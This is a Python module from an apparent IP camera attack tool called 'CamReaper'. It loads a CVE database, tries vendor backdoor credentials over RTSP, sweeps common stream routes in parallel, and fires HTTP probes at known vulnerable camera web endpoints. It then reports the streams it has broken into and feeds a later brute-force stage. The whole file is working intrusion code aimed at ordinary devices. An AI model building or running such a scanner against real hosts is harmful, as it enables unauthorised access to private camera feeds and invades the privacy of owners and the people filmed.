"""CVE exploit engine for IP camera scanning.

Loads a CVE database and applies vendor-specific exploits (backdoor credentials
and HTTP probes) against discovered hosts.  Designed to plug into the scanner's
three-stage pipeline as a lightweight pre-brute-force stage.

Exploit types
-------------
* ``backdoor_creds``: vendor-specific hardcoded credentials tried via RTSP
  DESCRIBE (reuses the existing auth machinery).
* ``http_probe``: HTTP GET/POST requests against known vulnerable endpoints;
  a pattern match in the response indicates the CVE is exploitable.
"""

import asyncio
import json
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from http.client import BadStatusLine
from pathlib import Path
from typing import Optional

from CamReaper.report import record_cve_test
from CamReaper.rtsp import RTSPClient

_DB_PATH = Path(__file__).parent / "cve_db.json"


@dataclass
class CVEEntry:
    id: str
    vendor: str
    type: str  # "backdoor_creds" | "http_probe"
    description: str
    severity: str
    credentials: list = field(default_factory=list)
    url_path: str = ""
    method: str = "GET"
    content_type: str = ""
    content: str = ""
    success_patterns: list = field(default_factory=list)


class CVEDatabase:
    """In-memory CVE database loaded from a JSON file."""

    def __init__(self, db_path: Optional[Path] = None):
        self.entries: list[CVEEntry] = []
        self.by_vendor: dict[str, list[CVEEntry]] = {}
        self._load(db_path or _DB_PATH)

    def _load(self, path: Path) -> None:
        if not path.exists():
            return
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            return
        for item in data.get("cves", []):
            entry = CVEEntry(
                id=item["id"],
                vendor=item["vendor"],
                type=item["type"],
                description=item.get("description", ""),
                severity=item.get("severity", "medium"),
                credentials=item.get("credentials", []),
                url_path=item.get("url_path", ""),
                method=item.get("method", "GET"),
                content_type=item.get("content_type", ""),
                content=item.get("content", ""),
                success_patterns=item.get("success_patterns", []),
            )
            self.entries.append(entry)
            self.by_vendor.setdefault(entry.vendor, []).append(entry)

    def get_for_vendor(self, vendor: str) -> list[CVEEntry]:
        return self.by_vendor.get(vendor, [])

    def get_all_creds(self, vendor: str = None) -> list[str]:
        """Collect all backdoor_creds CVEs for a vendor (or all vendors)."""
        creds = []
        entries = self.by_vendor.get(vendor, []) if vendor else self.entries
        for e in entries:
            if e.type == "backdoor_creds":
                creds.extend(e.credentials)
        return creds


async def _http_request(
    ip: str, port: int, path: str, method: str = "GET",
    content_type: str = "", content: str = "", timeout: float = 5.0,
) -> str:
    """Perform an HTTP request in a thread (urllib is blocking).

    Returns the response body as a string, or empty string on failure.
    """
    scheme = "https" if port in (443, 8443) else "http"
    actual_port = port if port not in (80, 443) else ""
    host = f"{ip}:{actual_port}" if actual_port else ip
    url = f"{scheme}://{host}{path}"

    def _do():
        headers = {"User-Agent": "Mozilla/5.0"}
        if content_type:
            headers["Content-Type"] = content_type
        req = urllib.request.Request(
            url, data=content.encode() if content else None,
            headers=headers, method=method,
        )
        try:
            resp = urllib.request.urlopen(req, timeout=timeout)
            return resp.read().decode("utf-8", errors="replace")
        except (urllib.error.URLError, OSError, ValueError):
            return ""

    return await asyncio.to_thread(_do)


async def try_backdoor_creds(
    client: RTSPClient, entry: CVEEntry, route_parallel: int = 8,
) -> Optional[str]:
    """Try backdoor credentials from a CVE entry via RTSP.

    Returns the working credential string (``user:pass``) or None.
    Uses a fresh RTSPClient so the caller's socket is not disrupted.
    """
    ip, port, timeout = client.ip, client.port, client.timeout
    for cred in entry.credentials:
        probe = RTSPClient(ip, port, timeout, cred)
        try:
            if not await probe.connect():
                continue
            code, _ = await _try_auth(probe, cred, "/")
            if code == "200":
                return cred
            if code == "404":
                # Valid creds, wrong route — sweep routes.
                found_route = await _probe_routes_quick(
                    probe, cred, route_parallel,
                )
                if found_route:
                    return cred
        except Exception:
            pass
        finally:
            probe.close()
    return None


async def _try_auth(client: RTSPClient, cred: str, route: str):
    """One authenticated DESCRIBE attempt. Returns ``(status_code, connected)``."""
    if not client.is_connected and not await client.connect():
        return "", False
    ok = await client.authorize(client.port, route, cred)
    if not ok and await client.connect():
        ok = await client.authorize(client.port, route, cred)
    return client.status_code, client.is_connected


async def _probe_routes_quick(
    client: RTSPClient, cred: str, route_parallel: int = 8,
) -> Optional[str]:
    """Quick route probe with a fixed common-route list."""
    common_routes = [
        "/", "/0/1:1/main", "/3", "/4",
        "/cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif",
        "/h264/ch1/main/av_stream", "/h264/ch1/sub/av_stream",
        "/main/av_stream", "/stream1", "/superstream",
        "/user=admin&password=&channel=1&stream=0.sdp?",
    ]
    if route_parallel <= 1:
        for route in common_routes:
            code, _ = await _try_auth(client, cred, route)
            if code == "200":
                return route
            if code in ("401", "403"):
                client.close()
                if not await client.connect():
                    return None
        return None

    sem = asyncio.Semaphore(route_parallel)
    result = None
    lock = asyncio.Lock()
    done = asyncio.Event()

    async def _try_one(route):
        nonlocal result
        if done.is_set() or result is not None:
            return
        async with sem:
            if done.is_set() or result is not None:
                return
            fresh = RTSPClient(client.ip, client.port, client.timeout, cred)
            try:
                if not await fresh.connect():
                    return
                code, _ = await _try_auth(fresh, cred, route)
                if code == "200":
                    async with lock:
                        if result is None:
                            result = route
                            done.set()
            except Exception:
                pass
            finally:
                fresh.close()

    tasks = [asyncio.create_task(_try_one(r)) for r in common_routes]
    await asyncio.gather(*tasks, return_exceptions=True)
    return result


async def try_http_probe(
    ip: str, port: int, entry: CVEEntry, timeout: float = 5.0,
) -> bool:
    """Try an HTTP-based CVE probe. Returns True if pattern matched."""
    body = await _http_request(
        ip, port, entry.url_path, entry.method,
        entry.content_type, entry.content, timeout,
    )
    if not body:
        return False
    return any(p.lower() in body.lower() for p in entry.success_patterns)


async def run_cve_stage(
    ip: str,
    live: RTSPClient,
    vendor: str,
    cve_db: CVEDatabase,
    route_parallel: int = 8,
    http_timeout: float = 5.0,
    stats: dict = None,
) -> list:
    """Run all CVE exploits for a detected vendor against one host.

    Returns a list of Found streams.
    """
    from CamReaper.scanner import Found

    entries = cve_db.get_for_vendor(vendor)
    if not entries:
        return []

    found = []
    for entry in entries:
        if stats is not None:
            stats["cve_tested"] = stats.get("cve_tested", 0) + 1
        if entry.type == "backdoor_creds":
            cred = await try_backdoor_creds(live, entry, route_parallel)
            if cred:
                await record_cve_test(ip, live.port, entry.id, True)
                found.append(Found(
                    ip=ip, port=live.port, route="/",
                    credentials=cred, vendor=vendor,
                ))
                # Confirmed stream - no need to probe further CVEs for this host.
                break
            else:
                await record_cve_test(ip, live.port, entry.id, False)

        elif entry.type == "http_probe":
            try:
                ok = await try_http_probe(ip, live.port, entry, http_timeout)
            except Exception:
                ok = False
            await record_cve_test(ip, live.port, entry.id, ok)
            # HTTP probes don't give us RTSP credentials, but they confirm
            # the CVE is present. We log it but don't add to found streams
            # unless we also found creds via backdoor_creds for this vendor.

    return found


async def probe_http_host(
    ip: str,
    port: int,
    cve_db: CVEDatabase,
    timeout: float = 5.0,
    stats: dict = None,
) -> list:
    """Probe one HTTP/HTTPS port for CVE exploits on a host's web panel.

    Fetches the root page to fingerprint the vendor, then runs every applicable
    ``http_probe`` CVE for that vendor (plus any generic http_probe CVEs).
    Returns a list of Found entries flagged as HTTP CVE hits.
    """
    import urllib.error

    from CamReaper.scanner import Found
    from CamReaper.vendor import detect_vendor_http

    # Fingerprint via a lightweight root GET (Server header + a peek of body).
    scheme = "https" if port in (443, 8443) else "http"
    actual_port = port if port not in (80, 443) else ""
    host = f"{ip}:{actual_port}" if actual_port else ip

    def _root():
        url = f"{scheme}://{host}/"
        try:
            resp = urllib.request.urlopen(url, timeout=timeout)
            return resp.read(8192).decode("utf-8", errors="replace")
        except (urllib.error.URLError, OSError, ValueError, BadStatusLine):
            return ""

    body = await asyncio.to_thread(_root)
    if not body:
        return []
    if stats is not None:
        stats["http_checked"] = stats.get("http_checked", 0) + 1

    vendor = detect_vendor_http("", body)

    # Candidate entries: vendor-specific for the detected vendor, plus any
    # Generic http_probe entries (vendor-agnostic endpoints).
    entries = list(cve_db.get_for_vendor(vendor))
    if vendor != "Generic":
        entries += cve_db.get_for_vendor("Generic")
    entries = [e for e in entries if e.type == "http_probe"]
    if not entries:
        return []

    found = []
    for entry in entries:
        if stats is not None:
            stats["cve_tested"] = stats.get("cve_tested", 0) + 1
        try:
            ok = await try_http_probe(ip, port, entry, timeout)
        except Exception:
            ok = False
        await record_cve_test(ip, port, entry.id, ok)
        if ok:
            found.append(Found(
                ip=ip, port=port, route=entry.url_path,
                credentials="", vendor=vendor,
                is_http_cve=True, cve_id=entry.id,
            ))
    return found
